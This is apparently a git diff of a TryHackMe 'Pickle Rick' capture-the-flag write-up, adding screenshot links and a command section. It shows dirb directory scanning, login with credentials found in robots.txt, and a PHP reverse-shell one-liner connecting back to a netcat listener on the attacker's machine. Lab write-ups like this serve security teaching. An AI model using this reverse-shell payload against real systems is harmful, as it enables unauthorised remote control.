@@ -72,7 +72,7 @@ DOWNLOADED: 28 - FOUND: 3
 ┌──(kali㉿kali)-[~]
 └─$ vim Extensions.txt
 ```
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/extensions.txt.png)
 6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created for files and directories using Dirb's default wordlist and then redirecting the results into a text file
 7. `cat {FILENAME3}.txt` to output the scan results from the previous command
 ```bash
@@ -163,17 +163,17 @@ Wubbalubbadubdub
 
 ##
 > Logging In
-10. `firefox "http://{TARGET IP}/login.php"` to open Firefox and redirect it to the target's web server's **login.php** page and log in using Rick's username that we found and the string we found in the **robots.txt** file as his password, which successfully logged us in
-![]()
+10. `firefox "http://{TARGET IP}/login.php"` to open Firefox and redirect it to the target's web server's **login.php** page and log in using Rick's username that we found and the string we found in the **robots.txt** file as his password, which successfully logged us in and brought us to a command panel
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/login.php.png)
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
 
 
 # Vulnerability Identification
 > Command Injection
 11. `sudo -l` to list the sudo privileges assigned to the user, which turns out that the current user we're logged in as can ran any command as root
 12. `php --version` to confirm that this server does in fact run PHP, which it does
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/php%20--version.png)
 13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell
-![]()
 
 # Vulnerability Exploitation
 > Reverse Shell
@@ -184,7 +184,7 @@ Wubbalubbadubdub
 listening on [any] 9999 ...
 ```
 15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Reverse%20Shell%20Payload.png)
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9999
@@ -305,6 +305,16 @@ fleeb juice
 27. `cat {SECRET INGREDIENT FILE3}.txt`
 
 # Dissecting Comands
+`dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
++ K
+
+
+`dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
++ K
+
+
+`php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
++ K
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
